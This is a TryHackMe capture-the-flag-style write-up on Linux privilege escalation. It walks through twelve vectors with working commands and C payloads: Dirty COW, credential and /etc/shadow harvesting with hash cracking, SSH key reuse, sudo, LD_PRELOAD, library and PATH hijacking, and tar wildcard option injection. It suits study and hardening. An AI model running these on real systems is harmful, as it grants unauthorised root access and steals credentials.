# Linux PrivEsc Arena — TryHackMe
**Author:** XENOS  
**Platform:** TryHackMe  
**Difficulty:** Intermediate  
**Category:** Privilege Escalation — Linux  
**Date:** 2026-04-06

---

## Overview

A comprehensive privilege escalation playground covering the most critical Linux PrivEsc vectors. The goal: start as a low-privileged user, identify misconfigurations and weaknesses, escalate to root using a variety of techniques.

This write-up documents every attack path covered, the underlying theory behind each vector, and the exact commands used — written for understanding, not just replication.

---

## Table of Contents

1. [Kernel Exploit — Dirty COW](#1-kernel-exploit--dirty-cow)
2. [Credential Hunting — Sensitive Files](#2-credential-hunting--sensitive-files)
3. [Weak File Permissions — /etc/shadow](#3-weak-file-permissions--etcshadow)
4. [SSH Key Exposure](#4-ssh-key-exposure)
5. [Sudo Misconfiguration — GTFOBins](#5-sudo-misconfiguration--gtfobins)
6. [Sudo + Service Binary — Reading Protected Files](#6-sudo--service-binary--reading-protected-files)
7. [Sudo + LD_PRELOAD Injection](#7-sudo--ld_preload-injection)
8. [SUID + Missing Shared Library (.so Hijacking)](#8-suid--missing-shared-library-so-hijacking)
9. [SUID + PATH Hijacking](#9-suid--path-hijacking)
10. [SUID + Function Override & Bash PS4](#10-suid--function-override--bash-ps4)
11. [Linux Capabilities — cap_setuid](#11-linux-capabilities--cap_setuid)
12. [Cron Jobs + Tar Wildcard Injection](#12-cron-jobs--tar-wildcard-injection)

---

## 1. Kernel Exploit — Dirty COW

### Theory

Dirty COW (CVE-2016-5195) is a race condition vulnerability in the Linux kernel's Copy-On-Write mechanism. When a process attempts to write to a read-only memory-mapped file, the kernel should create a private copy. Due to a race condition between two threads, the kernel briefly loses track of permissions and writes directly to the original file — allowing an unprivileged user to write to any file on the system, including root-owned binaries.

### Detection

```bash
/home/user/tools/exploit-suggester/exploit-suggester.sh
# Output: system is vulnerable to "dirtycow"
```

### Exploitation

```bash
# Compile the exploit (requires thread support)
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w

# Run the exploit — replaces /usr/bin/passwd with a root shell
./c0w

# Trigger the replaced binary
passwd

# Verify root
id
```

**Why `/usr/bin/passwd`?** — It has the SUID bit set and is owned by root. Any write to it by the exploit means the next execution runs our payload as root.

> **CVE:** CVE-2016-5195  
> **Kernel versions affected:** < 4.8.3

---

## 2. Credential Hunting — Sensitive Files

### Theory

Administrators often store credentials in plaintext inside configuration files. If file permissions are misconfigured, a low-privileged user can read them and reuse credentials for privilege escalation.

### Key Locations

| File | What to Look For |
|---|---|
| `~/.bash_history` | Commands typed with passwords inline |
| `/etc/openvpn/auth.txt` | VPN credentials in plaintext |
| `~/.irssi/config` | IRC client saved passwords |
| `wp-config.php` | Database credentials |
| `~/.git-credentials` | Git authentication tokens |

### Commands

```bash
# Check VPN config for credential file reference
cat /home/user/myvpn.ovpn
# auth-user-pass /etc/openvpn/auth.txt

# Read the credentials file
cat /etc/openvpn/auth.txt
# user
# password321

# Search bash history for passwords
cat /home/user/.bash_history | grep -i passw
# mysql -h somehost.local -uroot -ppassword123

# Search IRC config
cat /home/user/.irssi/config | grep -i passw
```

### Result

Found MySQL credentials: `-uroot -ppassword123`  
Found VPN credentials: `user:password321`

---

## 3. Weak File Permissions — /etc/shadow

### Theory

`/etc/shadow` stores hashed passwords for all system users. Correct permissions: `640` (root read/write, shadow group read). If world-readable (`644` or `rw-rw-r--`), any user can extract and attempt to crack the hashes offline.

### Detection

```bash
ls -la /etc/shadow
# -rw-rw-r-- 1 root shadow 809 Jun 17 2020 /etc/shadow
# World-readable — critical misconfiguration
```

### Exploitation

```bash
# Extract both files to attacker machine, then:
unshadow passwd.txt shadow.txt > unshadowed.txt

# Crack with hashcat (mode 1800 = sha512crypt)
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

**Why unshadow?** — `hashcat` needs both the username (from `/etc/passwd`) and the hash (from `/etc/shadow`) combined in one format. `unshadow` merges them into the expected structure.

**Hash identifier:** `$6$` prefix = SHA-512crypt (most common on modern Linux)

---

## 4. SSH Key Exposure

### Theory

SSH supports key-based authentication: the client holds a private key (`id_rsa`), the server holds the corresponding public key (`authorized_keys`). If a private key is found on the target machine in a world-readable location, it can be copied to the attacker machine and used to authenticate as the key's owner.

### Detection

```bash
find / -name authorized_keys 2>/dev/null
# /root/.ssh/authorized_keys

find / -name id_rsa 2>/dev/null
# /backups/supersecretkeys/id_rsa
```

### Exploitation

```bash
# On attacker machine — copy the id_rsa content, then:
chmod 400 id_rsa
ssh -i id_rsa root@<target-ip>
```

**Why `chmod 400`?** — SSH refuses to use a private key with loose permissions and throws `WARNING: UNPROTECTED PRIVATE KEY FILE`. The key must be readable only by the owner.

---

## 5. Sudo Misconfiguration — GTFOBins

### Theory

`sudo` allows specific commands to run with elevated privileges. If a binary that can spawn a shell is listed in sudoers, it can be abused to escalate to root. The reference for this is [GTFOBins](https://gtfobins.github.io).

### Detection

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find
# (root) NOPASSWD: /usr/bin/vim
# (root) NOPASSWD: /usr/bin/awk
```

### Exploitation

```bash
# find
sudo find /bin -name nano -exec /bin/sh \;

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# vim
sudo vim -c '!sh'
```

Each of these binaries supports executing shell commands internally. When run under sudo, that internal shell inherits root privileges.

---

## 6. Sudo + Service Binary — Reading Protected Files

### Theory

Some binaries accept a config file as an argument. If they can run via sudo, they can be tricked into reading any file on the system — including `/etc/shadow` — and leaking its contents through error messages.

### Exploitation

```bash
sudo apache2 -f /etc/shadow
# AH00526: Syntax error on line 1 of /etc/shadow:
# root:$6$Tb/euwmK$OXA...  <-- hash leaked in error output
```

```bash
# Save the hash, crack with John
echo '$6$Tb/euwmK$OXA...' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## 7. Sudo + LD_PRELOAD Injection

### Theory

`LD_PRELOAD` tells the dynamic linker to load a specified shared library before all others. If a sudo rule preserves this environment variable (`env_keep += LD_PRELOAD`), an attacker can inject a malicious library that executes as root when any sudo-permitted binary is run.

### Detection

```bash
sudo -l
# env_keep+=LD_PRELOAD
```

### Exploitation

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");  // prevent infinite loop
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# Compile as shared library
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles

# Execute with LD_PRELOAD pointing to our library
sudo LD_PRELOAD=/tmp/shell.so apache2

id
# uid=0(root)
```

**Why `_init()`?** — It's a special function that executes automatically when a shared library is loaded. We don't need to call it explicitly.

---

## 8. SUID + Missing Shared Library (.so Hijacking)

### Theory

When a SUID binary loads a shared library, it searches for it in a defined order (RPATH, LD_LIBRARY_PATH, default paths). If a required library is missing and the search path includes a directory writable by the attacker, a malicious library can be placed there and loaded automatically with root privileges.

### Detection

```bash
find / -type f -perm -04000 -ls 2>/dev/null
# /usr/local/bin/suid-so

# Trace system calls to find missing libraries
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
# open("/home/user/.config/libcalc.so", ...) = -1 ENOENT
```

### Exploitation

```c
// libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```bash
mkdir /home/user/.config

gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c

/usr/local/bin/suid-so

/tmp/bash -p
id
# uid=0(root)
```

---

## 9. SUID + PATH Hijacking

### Theory

If a SUID binary calls another program using a relative name (e.g., `service` instead of `/usr/sbin/service`), the OS resolves it by searching directories in `$PATH` left to right. By prepending an attacker-controlled directory to `$PATH` and placing a malicious binary with the same name there, the SUID binary executes the malicious version as root.

### Detection

```bash
strings /usr/local/bin/suid-env
# ...
# service apache2 start   <-- relative path, exploitable
```

### Exploitation

```bash
# Create a malicious "service" binary
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Trigger the SUID binary
/usr/local/bin/suid-env

id
# uid=0(root)
```

---

## 10. SUID + Function Override & Bash PS4

### Theory

`suid-env2` uses the full path `/usr/sbin/service` — PATH hijacking fails. Two alternative approaches work:

**Method 1 — Function Override:** Bash resolves exported functions before checking the filesystem, even for absolute paths in some configurations. Defining a function named `/usr/sbin/service` and exporting it causes bash to execute the function instead of the real binary.

**Method 2 — PS4 + SHELLOPTS:** When bash debug mode (`xtrace`) is active, it executes the content of `PS4` before each command. By setting `PS4` to a malicious command and running the SUID binary in a debug shell, the payload executes with root privileges.

### Detection

```bash
strings /usr/local/bin/suid-env2
# /usr/sbin/service apache2 start   <-- full path
```

### Exploitation — Method 1

```bash
function /usr/sbin/service() {
    cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p
}
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

### Exploitation — Method 2

```bash
env -i SHELLOPTS=xtrace \
PS4='$(cp /bin/bash /tmp && chmod +s /tmp/bash)' \
/bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

---

## 11. Linux Capabilities — cap_setuid

### Theory

Linux Capabilities divide root privileges into granular units. `cap_setuid` allows a process to change its effective UID. If a binary with this capability can execute arbitrary code (e.g., Python), it can call `setuid(0)` to become root — without being SUID.

### Detection

```bash
getcap -r / 2>/dev/null
# /usr/bin/python2.6 = cap_setuid+ep
```

### Exploitation

```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

id
# uid=0(root)
```

---

## 12. Cron Jobs + Tar Wildcard Injection

### Theory

The `tar` command supports checkpoint actions (`--checkpoint-action=exec=`). When a cron job runs `tar` with a wildcard (`*`), the shell expands the wildcard to all filenames in the directory. If filenames are crafted to look like `tar` options, they are interpreted as arguments — not as file names. This is called **argument injection via wildcard expansion**.

### Detection

```bash
cat /etc/crontab
# * * * * * root cd /home/user && tar czf /tmp/backup.tar.gz *

cat /usr/local/bin/compress.sh
# tar czf /tmp/backup.tar.gz *    <-- wildcard
```

### Exploitation

```bash
# Create the payload script
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh

# Create files named as tar options
touch /home/user/--checkpoint=1
touch '/home/user/--checkpoint-action=exec=sh runme.sh'

# Wait ~1 minute for cron to execute, then:
/tmp/bash -p

id
# uid=0(root)
```

**Why does this work?** — The wildcard `*` expands to all filenames. `tar` sees `--checkpoint=1` and `--checkpoint-action=exec=sh runme.sh` as valid options and executes `runme.sh` as root.

---

## Key Takeaways

| Vector | Root Cause |
|---|---|
| Dirty COW | Unpatched kernel |
| Credential Hunting | Plaintext secrets in readable files |
| /etc/shadow permissions | Misconfigured file permissions |
| SSH Key exposure | Private key stored in wrong location |
| Sudo GTFOBins | Overly permissive sudoers |
| LD_PRELOAD | env_keep preserving dangerous variables |
| .so Hijacking | SUID binary loading from writable path |
| PATH Hijacking | SUID binary using relative command names |
| Capabilities | cap_setuid on scripting interpreters |
| Tar wildcard | Unquoted wildcards in cron scripts |

---

## Tools Used

- `gcc` — C compiler
- `strace` — system call tracer
- `strings` — extract readable strings from binaries
- `getcap` — list file capabilities
- `find` — filesystem search
- `hashcat` / `john` — password hash cracking
- `unshadow` — combine passwd + shadow for cracking

---

*Write-up by XENOS — [github.com/obadahamed](https://github.com/obadahamed)*
